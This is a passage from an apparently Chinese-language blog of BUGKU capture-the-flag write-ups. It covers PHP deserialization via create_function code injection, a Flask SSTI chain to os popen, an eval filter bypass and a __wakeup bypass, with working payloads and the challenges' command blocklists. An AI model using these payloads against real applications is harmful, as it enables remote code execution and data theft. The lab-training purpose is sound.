class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>.<span class="variable">$b</span>);</span><br><span class="line">        <span class="variable">$a</span>(<span class="string">&quot;&quot;</span>, <span class="variable">$b</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;(ls|find|cat|grep|head|tail|echo)&quot;</span>, <span class="variable">$str</span>) &gt; <span class="number">0</span>) <span class="keyword">die</span>(<span class="string">&quot;You are a hacker, get out&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setAB</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不会做，直接去学别人的做法了</p>
<p>利用的是create_function()的特性，那我们先了解一下这个函数</p>
<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h2><p><code>create_function()</code> 是 PHP 中的一个函数，用于创建一个匿名函数。</p>
<p>基础语法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">create_function</span>(<span class="keyword">string</span> <span class="variable">$args</span>, <span class="keyword">string</span> <span class="variable">$code</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>args</code>：是一个代表函数参数的字符串，参数之间用逗号分隔。</li>
<li><code>$code</code>：是一个包含函数体代码的字符串。</li>
</ul>
<p>举个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$myFunction</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return $a + $b;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$myFunction</span>(<span class="number">2</span>, <span class="number">3</span>); <span class="comment">// 输出 5</span></span><br></pre></td></tr></table></figure>

<p>创建了一个匿名函数，接受两个参数 <code>$a</code> 和 <code>$b</code>，然后返回这两个参数的和。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$double</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$num&#x27;</span>, <span class="string">&#x27;return $num * 2;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$double</span>(<span class="number">5</span>); <span class="comment">// 输出10</span></span><br></pre></td></tr></table></figure>

<p>创建了一个匿名函数，接受参数$num，函数执行代码是返回这个参数的两倍值</p>
<p>拿刚刚第一个例子来说，我们通过create_function()创建出来的方法就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那接下来我们来看题目</p>
<p>因为反序列化是不会触发构造函数的，所以我们可以忽略他，我们来看一下析构函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    <span class="variable">$b</span> = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$a</span>.<span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$a</span>(<span class="string">&quot;&quot;</span>, <span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们注意到$a(“”,$b);是符合我们create_function()的语法的，那我们令$a&#x3D;create_function,但是我们只有第二个参数可控，所以这时候的方法结构就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$b</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是有一个点我们需要注意，我们创建的方法是不会自动调用的，所以我们如果想要通过这里去执行命令的话，需要先把我们的function闭合，然后在function外写相关的命令去执行，例如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>但是单单是这样是不够的，我们如果只是让$b&#x3D;;}system(“ls”);的话，就会是这样的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    ;&#125;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;l\s /&quot;</span>);<span class="comment">/*;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>

<p>可以看到会多出来一个}，这时候我们需要像sql注入一样用注释去把他注释掉</p>
<p>所以我们最终的payload就是:(记得绕过ls哈不然会被过滤)</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=create_function,$b=;&#125;<span class="keyword">system</span>(<span class="string">&quot;l\s /&quot;</span>);<span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Noteasy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $a=new Noteasy(&quot;create_function&quot;,&quot;;&#125;system(&#x27;l\s &#x27;);/*&quot;);</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Noteasy</span>(<span class="string">&quot;create_function&quot;</span>,<span class="string">&quot;;&#125;system(&#x27;tac flag&#x27;);/*&quot;</span>);<span class="comment">#可以看flag的有很多，比如more,tac</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<h1 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h1><p>flask下的ssti注入漏洞</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241129210543147.png" alt="image-20241129210543147"></p>
<p>存在ssti注入漏洞，那就用魔术方法来找一下flag</p>
<p><code>__class__</code>:用于返回对象所属的类</p>
<p><code>__base__</code>:以字符串的形式返回一个类所继承的类</p>
<p><code>__bases__</code>:以元组的形式返回一个类所继承的类</p>
<p><code>__mro__</code>:返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类（当调用_mro_[1]或者-1时作用其实等同于_base_）</p>
<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">第一步，拿到当前类，也就是用<span class="number">__</span><span class="keyword">class</span><span class="number">__</span></span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.<span class="number">__</span><span class="keyword">class</span><span class="number">__</span>&#125;&#125;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line">第二步，拿到基类，这里可以用<span class="number">__</span>base<span class="number">__</span>，也可以用<span class="number">__m</span>ro<span class="number">__</span></span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.<span class="number">__</span><span class="keyword">class</span><span class="number">__._</span><span class="number">_</span>base<span class="number">__</span>&#125;&#125;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"><span class="comment">//object为str的基类</span></span><br><span class="line"><span class="keyword">object</span>是父子关系的顶端，所有的数据类型最终的父类都是<span class="keyword">object</span></span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.<span class="number">__</span><span class="keyword">class</span><span class="number">__._</span><span class="number">_m</span>ro<span class="number">__</span>&#125;&#125;</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure>

<p><code>__subclasses__()</code>:获取类的所有子类</p>
<p><code>__init__</code>:所有自带带类都包含init方法，常用他当跳板来调用globals</p>
<p><code>__globals__</code>:会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合init使用</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第三步，拿到基类的子类，用<span class="variable">__subclasses__</span>()</span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.<span class="variable">__class__</span>.<span class="variable">__base__</span>.<span class="variable">__subclasses__</span>()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/BUGKU/image-20241129211537290.png" alt="image-20241129211537290"></p>
<p>列出子类了</p>
<p>接下来的话，就要找可利用的类，寻找那些有回显的或者可以执行命令的类</p>
<p>大多数利用的是<code>os._wrap_close</code>这个类，可以执行命令，但是需要注意的是，这个类是python的标准库，所以需要在python环境下运行。</p>
<p>所以我们搜索一下这个类，然后看看这个类的下标</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241129212037211.png" alt="image-20241129212037211"></p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241129212118126.png" alt="image-20241129212118126"></p>
<p>因为下标是从0开始的，所以我们取127</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[127]&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/BUGKU/image-20241129212321382.png" alt="image-20241129212321382"></p>
<p>接下来就可以利用<code>os._wrap_close</code><br>首先先调用它的__init__方法进行初始化类</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0]. __subclasses__()[154].__init__&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后再调用__globals__获取到方法内以字典的形式返回的方法、属性等，那我们就获取一下flag属性看看有没有</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;.__class__.__bases__</span>[0]. __subclasses__()[154].__init__.__globals__[&#x27;popen&#x27;](<span class="name">&#x27;echo $FLAG&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/BUGKU/image-20241129213813099.png" alt="image-20241129213813099"></p>
<h1 id="闪电十六鞭"><a href="#闪电十六鞭" class="headerlink" title="闪电十六鞭"></a>闪电十六鞭</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Click here</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$exam</span> = <span class="string">&#x27;return\&#x27;&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">time</span>()).<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;./?flag=&#x27;</span>.<span class="variable">$exam</span>.<span class="string">&#x27;&quot;&gt;Click here&lt;/a&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) != <span class="title function_ invoke__">strlen</span>(<span class="variable">$exam</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;长度不允许&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/`|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;关键字不允许&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$flag</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;马老师发生甚么事了&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>这里的话有一个click here，意思就是当我们没有传入flag的时候就会出现这个按钮</p>
<p>正则匹配就不需要讲了，我们先来看看$exam</p>
<p>$exam &#x3D; ‘return&#39;‘.sha1(time()).’&#39;;’;</p>
<ul>
<li><code>sha1(time())</code>：这里 <code>time()</code> 函数返回当前时间戳，<code>sha1()</code> 函数对时间戳进行 SHA-1 哈希运算，返回一个40位的十六进制数字字符串。</li>
<li><code>return\&#39;</code> 和 <code>\&#39;</code>：这里是将字符串 <code>&#39;return&#39;</code> 和 <code>&#39;\&#39;</code> 连接在一起，其中 <code>\&#39;</code> 是用来转义单引号 <code>&#39;</code> 的。</li>
<li>所以，最终 <code>$exam</code> 的值是一个包含返回语句的字符串，返回的内容是当前时间戳经过 SHA-1 哈希后的结果。</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;./?flag=&#x27;.$exam.&#x27;&quot;</span>&gt;</span>Click here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure>

<p>在这里可以看到在我们点击了之后flag传入的参数就是exam的值</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241129151847256.png" alt="image-20241129151847256"></p>
<p>我们拿去解码可以得到exam的值为</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return&#x27;02edd67c<span class="number">247506</span>7bbdec<span class="number">0418</span>d9c630b2b0c952fa&#x27;<span class="punctuation">;</span></span><br></pre></td></tr></table></figure>

<p>但是对于</p>
<p>if (eval($_GET[‘flag’]) &#x3D;&#x3D;&#x3D; sha1($flag)) {<br>    echo $flag;</p>
<p>来说，我们需要让eval执行flag语句后的shal值和flag的相等</p>
<p>代码解析完成，开始做题</p>
<p>我们先看看exam的长度是多少</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;return&#x27;02edd67c2475067bbdec0418d9c630b2b0c952fa&#x27;;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#输出结果:49</span></span><br></pre></td></tr></table></figure>

<p>所以我们的flag的长度要求是49</p>
<p>我先给payload再进行讲解</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?flag=<span class="variable">$a</span>=<span class="string">&#x27;fla9&#x27;</span>;<span class="variable">$a</span>&#123;<span class="number">3</span>&#125;=<span class="string">&#x27;g&#x27;</span>;<span class="meta">?&gt;</span><span class="meta">&lt;?=</span><span class="variable">$$a</span>;<span class="meta">?&gt;</span><span class="number">111111111111111111</span></span><br></pre></td></tr></table></figure>

<ul>
<li>用单引号绕过双引号验证</li>
<li>通过参数套用绕过flag</li>
<li>&lt;?&#x3D;$$a;?&gt;是为了输出我们的flag</li>
</ul>
<p>&lt;? ?&gt;和&lt;?&#x3D; ?&gt;是短标签而&lt;?php ?&gt;是长标签，<br>其中&lt;?&#x3D; 是代替 &lt;? echo的，&lt;? ?&gt; 代替的是&lt;?php ?&gt;</p>
<ul>
<li>这里用?&gt;是为了闭合eval，<strong>因为短标签格式是可以识别phpinfo() ?&gt;等类似只有?&gt;形式的代码，所以payload前半段不需要加上&lt;?</strong></li>
</ul>
<h1 id="安慰奖"><a href="#安慰奖" class="headerlink" title="安慰奖"></a>安慰奖</h1><p>在源代码中发现了一串被注释掉的编码，解码后提示是备份，那可能是源码泄露了，扫出来两个文件</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241129173833646.png" alt="image-20241129173833646"></p>
<p>但是读不出来flag.php，那我们把index.php.bak下载下来看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$a</span> = `<span class="variable language_">$this</span>-&gt;cmd`;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里的话还是反序列化，但是需要绕过我们的wakeup方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;O:3:&quot;ctf&quot;:3:&#123;s:11:&quot;*username&quot;;s:5:&quot;admin&quot;;s:6:&quot;*cmd&quot;;s:2:&quot;ls&quot;;&#125;&#x27;</span>);<span class="comment">#修改属性个数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意，这里的话要关注成员属性的类型，因为是受保护的成员属性，所以我们的url编码上会有所差别</p>
<p>payload</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code<span class="operator">=</span>O<span class="variable">%3</span>A<span class="number">3</span><span class="variable">%3</span>A<span class="variable">%22</span>ctf<span class="variable">%22</span><span class="variable">%3</span>A<span class="number">3</span><span class="variable">%3</span>A<span class="variable">%7</span>Bs<span class="variable">%3</span>A<span class="number">11</span><span class="variable">%3</span>A<span class="variable">%22</span><span class="variable">%00</span><span class="variable">%2</span>A<span class="variable">%00</span>username<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">5</span><span class="variable">%3</span>A<span class="variable">%22</span>admin<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">6</span><span class="variable">%3</span>A<span class="variable">%22</span><span class="variable">%00</span><span class="variable">%2</span>A<span class="variable">%00</span>cmd<span class="variable">%22</span><span class="variable">%3</span>Bs<span class="variable">%3</span>A<span class="number">2</span><span class="variable">%3</span>A<span class="variable">%22</span>ls<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%7</span>D</span><br></pre></td></tr></table></figure>

<p>然后用tac进行读取文件就可以了</p>
<h1 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a>decrypt</h1><p>是一个附件，我以为能省金币来着结果发现下载需要金币。。</p>
